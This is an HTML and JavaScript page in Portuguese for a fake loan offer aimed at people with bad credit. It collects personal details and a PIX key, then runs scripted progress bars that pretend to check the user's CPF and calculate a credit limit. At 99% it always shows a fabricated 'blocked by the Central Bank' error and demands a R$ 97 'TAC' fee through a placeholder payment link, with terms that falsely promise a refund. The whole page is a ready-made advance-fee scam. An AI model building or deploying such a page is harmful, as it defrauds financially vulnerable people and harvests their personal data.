...
<head>
    ...
    <style>
        ...
        /* Carrossel de depoimentos suave */
    ...
    <div class="max-w-md mx-auto pb-10">
        ...
        <div id="step1" class="step active p-6">
            <div class="text-center mb-8">
                ...
                <p class="text-gray-500 mt-2">Mesmo negativado ou com score baixo.</p>
            </div>

            <div class="bg-white rounded-3xl p-6 card-shadow mb-8 border-2 border-green-50">
                <h2 class="font-bold text-gray-800 mb-4 text-center">Selecione o valor desejado:</h2>
                <div class="space-y-3">
                    <button onclick="nextStep(2)" class="w-full p-4 border-2 border-gray-100 rounded-2xl flex justify-between items-center hover:border-green-400 transition">
                        <span class="font-bold">R$ 2.500,00</span>
                        <span class="text-[10px] font-bold text-green-500">LIBERAÇÃO IMEDIATA</span>
                    </button>
                    <button onclick="nextStep(2)" class="w-full p-4 border-2 border-gray-100 rounded-2xl flex justify-between items-center hover:border-green-400 transition">
                        <span class="font-bold">R$ 5.000,00</span>
                        <span class="text-[10px] font-bold text-green-500">MAIS SOLICITADO</span>
                    </button>
                    <button onclick="nextStep(2)" class="w-full p-4 border-2 border-gray-100 rounded-2xl flex justify-between items-center hover:border-green-400 transition">
                        <span class="font-bold">R$ 15.000,00</span>
                        <span class="text-[10px] font-bold text-gray-400">ANÁLISE DE SCORE</span>
                    </button>
                    <button onclick="nextStep(2)" class="w-full p-4 border-2 border-gray-100 rounded-2xl flex justify-between items-center hover:border-green-400 transition">
                        <span class="font-bold">R$ 30.000,00</span>
                        <span class="text-[10px] font-bold text-gray-400">APOSENTADOS/CLT</span>
                    </button>
                </div>
            </div>
            ...
            <div class="mb-8">
                ...
                <div class="flex gap-4 overflow-x-auto pb-4 no-scrollbar px-2">
                    ...
                    <div class="min-w-[280px] bg-white p-4 rounded-2xl shadow-sm border border-gray-100">
                        <div class="flex gap-1 text-yellow-400 mb-2 text-xs">★★★★★</div>
                        <p class="text-[13px] text-gray-600 italic">"Atendimento top no suporte e dinheiro na conta sem burocracia de papel."</p>
        ...
        <div id="step2" class="step p-6">
            <h2 class="text-2xl font-black mb-6">Identificamos seu perfil. <br>Preencha abaixo:</h2>
            <div class="space-y-4">
                ...
                <input type="tel" placeholder="Data de Nascimento" oninput="mask(this, '##/##/####')" class="w-full p-4 bg-white border-2 border-gray-100 rounded-xl outline-none focus:border-green-500">
            </div>
        ...
        <div id="step4" class="step p-6 text-center">
            <div class="bg-white border-2 border-green-500 p-8 rounded-[40px] mb-8 card-shadow">
                <div class="w-12 h-12 bg-green-500 text-white rounded-full flex items-center justify-center mx-auto mb-4">✓</div>
            ...
            <div class="space-y-3 text-left">
                <div onclick="selectP(this)" class="p-4 border-2 border-green-500 bg-green-50 rounded-2xl flex justify-between items-center cursor-pointer">
                    <div>
                        <div class="font-bold">24 parcelas fixas</div>
                        <div class="text-[10px] text-green-600 font-bold uppercase">Primeira parcela em 180 dias</div>
                    </div>
                    <span class="text-green-600">●</span>
                </div>
                <div onclick="selectP(this)" class="p-4 border-2 border-gray-100 bg-white rounded-2xl flex justify-between items-center cursor-pointer">
                    <div>
                        <div class="font-bold">48 parcelas fixas</div>
                        <div class="text-[10px] text-gray-400 font-bold uppercase">Primeira parcela em 180 dias</div>
                    </div>
                </div>
            </div>
        ...
        <div id="step5" class="step p-6">
            ...
            <div class="bg-gray-100 p-4 rounded-2xl text-[11px] text-gray-500 h-60 overflow-y-auto mb-6 leading-relaxed">
                <p class="mb-2"><strong>1. DO PAGAMENTO:</strong> O contratante está ciente de que a primeira parcela do empréstimo será cobrada apenas após o período de 180 dias (6 meses).</p>
                <p class="mb-2"><strong>2. DA TAXA TAC:</strong> Para a liberação de valores via PIX Prioritário, é necessário a liquidação da Tarifa de Abertura de Crédito (TAC), que garante a autenticidade da transação.</p>
                <p><strong>3. DO REEMBOLSO:</strong> O valor da taxa TAC será estornado e somado ao valor do empréstimo recebido na conta do cliente.</p>
            </div>
            <label class="flex items-center gap-3 mb-8 cursor-pointer">
                <input type="checkbox" id="checkT" class="w-6 h-6 accent-[#00d35d]">
                <span class="text-sm font-bold text-gray-700">Concordo com os termos e prazos.</span>
            </label>
            <button onclick="validarT()" class="btn-green uppercase">CONCORDAR E RECEBER</button>
        </div>

        <div id="step6" class="step p-6">
            <h2 class="text-2xl font-black mb-6">Dados para Recebimento</h2>
            <div class="space-y-4">
                ...
                <input type="text" placeholder="Chave PIX (CPF, Celular ou E-mail)" class="w-full p-4 bg-white border-2 border-gray-100 rounded-xl outline-none focus:border-green-500">
            </div>
        ...
        <div id="step7" class="step p-6 text-center">
            ...
            <p class="text-gray-400 font-bold uppercase tracking-widest text-[10px]" id="final-status">Preparando envio prioritário...</p>

            <div id="error-card" class="hidden mt-10 bg-white rounded-3xl p-8 border-2 border-red-500 card-shadow">
                <div class="text-red-500 text-5xl mb-4">⚠️</div>
                <h3 class="text-xl font-black text-gray-900 mb-2">ERRO NO ENVIO</h3>
                <p class="text-gray-500 text-sm leading-relaxed mb-6">O Banco Central bloqueou a transferência. É necessário o pagamento da <b>Tarifa TAC</b> para validar sua conta e liberar o PIX.</p>
                <div class="bg-gray-50 p-4 rounded-xl mb-6 font-black text-2xl">R$ 97,00</div>
                <button onclick="window.location.href='SEU_LINK_AQUI'" class="btn-green bg-red-600 shadow-none">PAGAR TARIFA E RECEBER</button>
            </div>
        </div>
    ...
    <script>
        ...
        function startAnalysis() {
            ...
            let t = setInterval(() => {
                p += 1;
                bar.style.width = p + "%";
                if(p == 20) { title.innerText = "Cruzando dados..."; msg.innerText = "Verificando CPF na base federal..."; }
                if(p == 50) { title.innerText = "Consultando margem..."; msg.innerText = "Calculando limite disponível..."; }
                if(p == 80) { title.innerText = "Finalizando..."; msg.innerText = "Gerando contrato e prazos..."; }
                if(p >= 100) { clearInterval(t); nextStep(4); }
            }, 100); // Mais lento como pedido
        }
        ...
        function startFinal() {
            ...
            let t = setInterval(() => {
                ...
                if(p == 30) st.innerText = "Conectando ao gateway PIX...";
                if(p == 70) st.innerText = "Autenticando TED TAC...";
                if(p == 99) {
                    clearInterval(t);
                    setTimeout(() => {
                        bar.style.background = "#ef4444";
                        pct.style.color = "#ef4444";
                        st.innerText = "TRANSFERÊNCIA BLOQUEADA";
                        document.getElementById('error-card').classList.remove('hidden');
                    }, 1500);
                }
            }, 150); // Carregamento final impactante
        }
    </script>
</body>
</html>
